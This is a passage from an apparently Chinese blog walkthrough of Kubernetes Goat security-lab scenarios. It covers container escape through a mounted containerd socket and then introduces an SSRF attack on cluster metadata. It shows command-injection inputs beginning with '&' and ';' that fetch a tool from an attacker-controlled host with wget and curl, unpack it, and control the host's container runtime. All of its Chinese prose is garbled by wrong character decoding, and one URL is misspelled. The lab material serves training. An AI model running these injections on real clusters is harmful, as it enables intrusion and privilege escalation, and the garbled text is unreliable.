<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.56.22.png" style="zoom:50%;">

<p>ä¸”ipåœ°å€å¦‚ä¸‹ï¼š</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.52.39.png" style="zoom:50%;">

<ul>
<li>ä¸‹è½½å…¶ä»–ç‰ˆæœ¬</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crictl-v1.33.0-linux-amd64.tar.gz
https://github.com/kuernetes-sigs/cri-tools/releases/download/v1.33.0/crictl-v1.33.0-linux-amd64.tar.gz

<span class="token operator">&amp;</span><span class="token function">wget</span> https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.33.0/crictl-v1.33.0-linux-amd64.tar.gz <span class="token parameter variable">-O</span> /tmp/crictl-v1.33.0-linux-amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2015.58.02.png" style="zoom:50%;">

<p>æ‰§è¡Œä¹‹åä¼šé•¿æ—¶é—´å»¶è¿Ÿï¼Œå¯èƒ½æ­£åœ¨ä¸‹è½½æ–‡ä»¶ã€‚ä½†è¿˜æ˜¯ä¼šç”±äºç½‘ç»œåŸå› ä¸‹è½½å¤±è´¥ã€‚</p>
<ul>
<li>å°†taråŒ…æ”¾åœ¨å±€åŸŸç½‘/vpsä¸Šä¾›ä¸‹è½½</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2013.29.04.png" style="zoom:30%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2013.29.52.png" style="zoom:50%;">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token function">wget</span> http://192.168.52.13:8000/crictl-v1.33.0-linux-amd64.tar.gz <span class="token parameter variable">-O</span> /tmp/crictl-1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2013.43.17.png" style="zoom:40%;">

<p>æˆåŠŸä¸‹è½½åˆ°crictl-1.tar.gzã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token function">curl</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-o</span> /tmp/crictl-2.tar.gz http://192.168.52.13:8000/crictl-v1.33.0-linux-amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2013.48.41.png" style="zoom:50%;">

<p>ç”¨curlä¹Ÿå¯ä»¥ä¸‹è½½ã€‚</p>
</blockquote>
<ul>
<li>3ï¼‰è§£å‹crictlç¨‹åº</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&amp;</span><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> /tmp/crictl-1.tar.gz <span class="token parameter variable">-C</span> /tmp/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2014.00.37.png" style="zoom:40%;">

<ul>
<li>4ï¼‰æ“ä½œå®¿ä¸»æœºdockerå®ˆæŠ¤è¿›ç¨‹</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span>/tmp/crictl <span class="token parameter variable">-r</span> unix:///custom/containerd/containerd.sock images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2014.01.50.png" style="zoom:50%;">

<ul>
<li>æ˜¾ç¤ºä¸ºç©ºå¯èƒ½åŸå› æ˜¯å½“å‰k8sæ­£åœ¨å ç”¨docker socketã€‚</li>
</ul>
<p>æ­£å¸¸æƒ…å†µä¸‹ä¼šçœ‹åˆ°å®¿ä¸»æœºçš„é•œåƒæ–‡ä»¶ï¼Œè¡¨æ˜é€šè¿‡å®¹å™¨çš„æŒ‚è½½çš„socketæ“æ§äº†å®¿ä¸»æœºçš„dockerå®ˆæŠ¤è¿›ç¨‹ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2014.09.05.png" style="zoom:40%;">



<h2 id="3-3-SSRF-in-the-Kubernetes-K8S-world"><a href="#3-3-SSRF-in-the-Kubernetes-K8S-world" class="headerlink" title="3.3 SSRF in the Kubernetes (K8S) world"></a>3.3 SSRF in the Kubernetes (K8S) world</h2><p>å¦‚ä½•åˆ©ç”¨SSRFæ¼æ´è·å–Kubernetesè®¿é—®æƒé™ã€‚</p>
<h3 id="3-3-1-åœºæ™¯ä»‹ç»"><a href="#3-3-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.3.1 åœºæ™¯ä»‹ç»"></a>3.3.1 åœºæ™¯ä»‹ç»</h3><p>è¯¥åœºæ™¯æ—¨åœ¨å±•ç¤ºå½“å‰äº‘ç¯å¢ƒä¸­æ™®éå­˜åœ¨çš„SSRFåº”ç”¨å®‰å…¨æ¼æ´ï¼Œæ¢è®¨è¯¥æ¼æ´å¦‚ä½•å½±å“Kubernetesé›†ç¾¤ã€å†…éƒ¨æœåŠ¡åŠå¾®æœåŠ¡æ¶æ„ã€‚æ­¤ç±»æ¼æ´å¯¹äº‘åŸç”Ÿç¯å¢ƒå…·æœ‰é‡å¤§å½±å“ï¼Œå…¶ä¸­Shopifyæ¡ˆä¾‹å°±æ˜¯å…¸å‹å®ä¾‹â€”â€”Exchangeç³»ç»Ÿä¸­çš„SSRFæ¼æ´æœ€ç»ˆå¯¼è‡´æ”»å‡»è€…è·å–äº†æ‰€æœ‰å®ä¾‹çš„ROOTæƒé™ã€‚</p>
<p>SSRFæ¼æ´é€æ¸æˆä¸ºäº‘åŸç”Ÿç¯å¢ƒçš„é¦–é€‰æ”»å‡»æ–¹æ³•ã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°å¦‚ä½•åˆ©ç”¨SSRFç­‰åº”ç”¨ç¨‹åºæ¼æ´æ¥è®¿é—®äº‘å®ä¾‹å…ƒæ•°æ®ä»¥åŠå†…éƒ¨æœåŠ¡å…ƒæ•°æ®ä¿¡æ¯ã€‚ç‰¹åˆ«æ˜¯æˆ‘ä»¬ä¼šçœ‹åˆ°KubernetesåŸç”ŸåŠŸèƒ½çš„å¼ºå¤§åŠŸèƒ½ï¼Œå¦‚æœåŠ¡å‘ç°ï¼Œå¯ä»¥è·å¾—å…¶ä»–å†…éƒ¨å¾®æœåŠ¡çš„è®¿é—®ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-12%2016.51.12.png" style="zoom:50%;">

<p>å®è·µç›®çš„ï¼š</p>
<ol>
<li>å¦‚ä½•åœ¨äº‘ç¯å¢ƒä¸‹åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„SSRFæ¼æ´ã€‚</li>
<li>ç†è§£å…ƒæ•°æ®æŸ¥è¯¢ç‰¹æ€§ä»¥è·å¾—å¯¹äº‘æä¾›æœåŠ¡æ•°æ®çš„è®¿é—®ã€‚</li>
<li>ç†è§£å’Œåˆ©ç”¨KubernetesåŸç”ŸæœåŠ¡å‘ç°åŠŸèƒ½å’ŒæœåŠ¡DNSæŸ¥è¯¢ã€‚</li>
<li>è·å¾—å¯¹é›†ç¾¤ç¯å¢ƒå†…éƒ¨å¾®æœåŠ¡çš„è®¿é—®æƒé™ã€‚</li>
</ol>
<h3 id="3-3-2-åœºæ™¯è®¿é—®"><a href="#3-3-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.3.2 åœºæ™¯è®¿é—®"></a>3.3.2 åœºæ™¯è®¿é—®</h3><p><code>http://192.168.52.13:1232</code></p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-13%2010.18.19.png" style="zoom:50%;">



<p>ç›®æ ‡ï¼šè¦å®Œæˆæ­¤åœºæ™¯ï¼Œéœ€è¦åœ¨å…ƒæ•°æ®secretsä¸­è·å–k8s-goat-FLAGæ ‡å¿—å€¼ã€‚</p>
<h3 id="3-3-3-å®è·µ"><a href="#3-3-3-å®è·µ" class="headerlink" title="3.3.3 å®è·µ"></a>3.3.3 å®è·µ</h3><blockquote>
